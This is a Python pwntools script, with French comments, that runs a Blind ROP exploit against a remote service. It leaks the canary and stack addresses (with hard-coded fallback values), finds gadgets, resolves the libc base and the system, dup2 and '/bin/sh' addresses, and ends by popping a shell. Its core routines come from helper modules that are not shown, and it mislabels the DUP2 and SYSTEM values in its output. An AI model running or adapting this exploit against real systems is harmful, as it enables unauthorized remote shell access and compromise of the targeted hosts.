#!/usr/bin/python3

from pwn import *
import sys, argparse

from argsprint import *
from binadr import *
from libcadr import *
from popshell import *


#----------
class BinAdr():

    def __init__(self):
        super().__init__()
        self.STOPGADGET = 0x0
        self.BROPGADGET = 0x0
        self.LEAKADR    = 0x0
        self.BINBASE    = 0x0

class LibcAdr():

    def __init__(self):
        super().__init__()
        self.LIBCBASE   = 0x0
        self.DUP2       = 0x0
        self.SYSTEM     = 0x0
        self.BINSH      = 0x0
        self.BUILDID    = '14cd15d2eb0bc25c89045873cf807f7533e4788d'
        self.NOLIBLEAK  = False

    def _get_NOLIBLEAK(self):
        return(self._NOLIBLEAK)

    def _set_NOLIBLEAK(self, VALUE):
        if VALUE:
            printInfo("No Libc leak will be performed")
        self._NOLIBLEAK = VALUE
        return(self._NOLIBLEAK)

    NOLIBLEAK=property(_get_NOLIBLEAK, _set_NOLIBLEAK)


class LeakedValues():

    def __init__(self):
        super().__init__()

        ##### A ADAPTER
        self.CANARY = p64(0x2d9958f51ef7d400)
        self.RBP        = p64(0x7ffc01a4ea30)
        self.RETADR = p64(0x7f7104bf223e)
        ###############


class ExploitStructure(BinAdr, LibcAdr, LeakedValues):

    HOST = ""
    PORT = ""

    def __init__(self):
        super().__init__()
        self.BUFFER = b'A'*40
        self.CRASH  = b'CRSHCRSH'

        self.EXPLOIT    = 1
        self.SIMPLELEAK = False
        self.HAND       = False
        self.DODO       = 0.03     # Cette valeur permet d'adapter les slesp si probleme de reception de paquet (a la campagne il doit etre grand x) )


    def remoteConnect(self):
        r = remote(self.HOST, self.PORT)
        return r

    def beginning(self):
        BEGIN = self.BUFFER + self.CANARY + self.RBP
        return BEGIN


#####

def persoPrint(STRING, ADR, NE):

    if NE == 1:
        print(CVER + "[+] " + STRING + " :  {}".format(hex(u64(ADR))) + CEND, end='')
    else:
        print(CVER + "[+] " + STRING + " :  {}".format(hex(u64(ADR))) + CEND)
    return

#####

def stopGadget(ExploitStructure):
    ExploitStructure.STOPGADGET  = getStopGadget(ExploitStructure)
    persoPrint('STOPGADGET ', ExploitStructure.STOPGADGET, 1)
    testGadget(ExploitStructure, 'STOPGADGET')
    return ExploitStructure

def bropGadget(ExploitStructure):
    ExploitStructure.BROPGADGET  = getBropGadget(ExploitStructure)
    persoPrint('BROPGADGET ', ExploitStructure.BROPGADGET, 1)
    testGadget(ExploitStructure, 'BROPGADGET')
    return ExploitStructure

def leakAdr(ExploitStructure):
    ExploitStructure.LEAKADR, ExploitStructure.BINBASE = getLeakFunction(ExploitStructure)
    persoPrint('BINBASE    ', ExploitStructure.BINBASE, 0)
    persoPrint('LEAKADR    ', ExploitStructure.LEAKADR, 1)
    testGadget(ExploitStructure, 'LEAKADR')
    return ExploitStructure

def libcBase(ExploitStructure):
    ExploitStructure.LIBCBASE = getLibcBase(ExploitStructure)
    persoPrint('LIBCBASE   ', ExploitStructure.LIBCBASE, 1)
    testGadget(ExploitStructure, 'LEAKADR')
    return ExploitStructure


def checkBuildID(BUILDID):
#   TMP = ExploitStructure

    if len(BUILDID) == 40:

        if (re.findall(r"([a-fA-F\d]{40})", BUILDID)):
            print(CVER + "[+] BuildID    :  " + BUILDID + CEND)
            return 1
        #else:
        #   print(CRED + "[!] Error with given BuildID    : " + TMP.BUILDID + CEND)
    else:
        print(CRED + "[!] Error with given BuildID    : " + BUILDID + CEND)
        '''
        voir si je demande quoi faire genre en remettre un, par exemple :
            ANOTHER = input(CJAU + "[?] Use specific BuildID ? (y / n) " + CEND)
            if ANOTHER == 'n':
                return 0
            elif ANOTHER == 'y':
                BUILDID = (input(CJAU + "[:] Put the other BuildID > " + CEND)).strip('\x0A')
            mais dans ce cas faut passer es en parametre
                return 1
        '''
        return 0


def leakLib(ExploitStructure):
    if (ExploitStructure.NOLIBLEAK):
        return
    leakStuff(ExploitStructure)

def symboles(ExploitStructure):
    ExploitStructure.SYSTEM, ExploitStructure.DUP2, ExploitStructure.BINSH = getSymboles(ExploitStructure)
    persoPrint('DUP2       ', ExploitStructure.SYSTEM, 0)
    persoPrint('SYSTEM     ', ExploitStructure.DUP2, 0)
    persoPrint('BINSH      ', ExploitStructure.BINSH, 0)

def popShellGotRoot(ExploitStructure):
    exploit(ExploitStructure)


#####

def main():

    es = ExploitStructure()
    checkParameter(es)

    if es.EXPLOIT == 1:
        printInfo("Starting simple leak")
        es  = leakValues(es)
        printDone("All 'Leakable' values have been leaked")

    elif es.EXPLOIT == 2:
        printInfo("Starting standard exploitation")

        if es.HAND:
            printInfo("Using manual values")
            persoPrint('CANARY     ', es.CANARY, 0)
            persoPrint('RBP        ', es.RBP, 0)
            persoPrint('RETADR     ', es.RETADR, 0)
        else:
            es = leakValues(es)

        es = stopGadget(es)
        es = bropGadget(es)
        es = leakAdr(es)

        es = libcBase(es)

        leakLib(es)
        symboles(es)

        popShellGotRoot(es)

        exit(':D')



if __name__ == '__main__':
    main()
